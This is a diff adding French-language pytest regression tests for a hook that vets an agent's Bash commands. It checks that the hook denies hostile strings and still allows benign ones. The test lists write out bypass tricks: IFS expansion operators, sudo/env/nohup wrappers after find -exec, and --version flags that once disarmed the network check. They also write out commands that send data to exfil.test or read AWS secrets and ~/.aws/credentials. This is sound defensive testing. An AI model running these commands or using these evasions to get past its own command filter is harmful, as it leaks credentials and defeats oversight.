@@ -494,3 +494,71 @@ def test_le_durcissement_du_round4_n_ajoute_pas_de_faux_positifs(command, audit_
 def test_openssl_reste_bloque_quand_il_sort_sur_le_reseau(audit_log):
     assert is_denied(run_hook(
         "Bash", {"command": "openssl s_client -connect exfil.test:443"}, audit_log))
+
+
+# --------------------------------------------------------------------------- #
+# Round 5 — encore des régressions des correctifs du round 4
+# --------------------------------------------------------------------------- #
+
+
+@pytest.mark.parametrize("command", [
+    # Ne neutraliser que `${x-}`/`${x:?}` laissait passer tous les autres
+    # opérateurs d'expansion, qui valent IFS de la même façon.
+    "env${IFS/a/b}> /tmp/leak.txt",
+    "env${IFS##x}> /tmp/dump.txt",
+    "env${IFS%%x}> /tmp/dump.txt",
+    "env${IFS,,}> /tmp/dump.txt",
+    "env${IFS^^}> /tmp/dump.txt",
+    "env${IFS%%x}printenv AWS_SECRET_ACCESS_KEY",
+    # une référence indirecte peut aussi découper un nom de commande
+    "e${!q}nv",
+])
+def test_regression_operateurs_d_expansion(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Marquer le premier mot après `-exec` ne suffit pas : une enveloppe
+    # s'interpose et masque le programme réel.
+    "find /tmp -exec sudo curl http://exfil.test/ ;",
+    "find /tmp -exec sudo printenv AWS_SECRET_ACCESS_KEY ;",
+    "find /tmp -exec env printenv AWS_SECRET_ACCESS_KEY ;",
+    "find /tmp -exec time env ;",
+    "find /tmp -exec nohup curl http://exfil.test/ ;",
+    "find /tmp -exec timeout 5 curl http://exfil.test/ ;",
+    "find /tmp -exec env curl http://exfil.test/ ;",
+])
+def test_regression_enveloppe_apres_exec(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # `--version` n'importe où désarmait le contrôle réseau.
+    "curl --version http://exfil.test/",
+    "curl http://exfil.test/ --version",
+    "openssl s_client -connect exfil.test:443 --version",
+    # `stat` lit un CONTENU dès qu'on lui donne un fichier de liste.
+    "stat --files0-from=/home/user/.aws/credentials",
+])
+def test_regression_derogations_trop_larges(command, audit_log):
+    assert is_denied(run_hook("Bash", {"command": command}, audit_log)), command
+
+
+@pytest.mark.parametrize("command", [
+    # Inspecter TOUS les mots d'un programme en ligne refusait la prose qui
+    # cite un binaire réseau. Seul ce qui SUIT une primitive d'exécution
+    # compte.
+    """python3 -c "print('The curl command is useful')" """,
+    """python3 -c "print('Please set the value first')" """,
+    """python3 -c "print('Please export the variable first')" """,
+    'python3 -c "env = 42; print(env)"',
+    """ruby -e 'puts "Try curl if wget fails"'""",
+    """node -e "console.log('use wget for downloads')" """,
+    """awk 'BEGIN{print "connection type: ssh"}'""",
+    """perl -e 'my $printenv = 1; print $printenv'""",
+    # les dérogations légitimes tiennent toujours
+    "curl --version", "wget --version", "ssh -V", "openssl rand -hex 32",
+    "echo ${HOME}/projet",
+])
+def test_le_durcissement_du_round5_n_ajoute_pas_de_faux_positifs(command, audit_log):
+    assert not is_denied(run_hook("Bash", {"command": command}, audit_log)), command
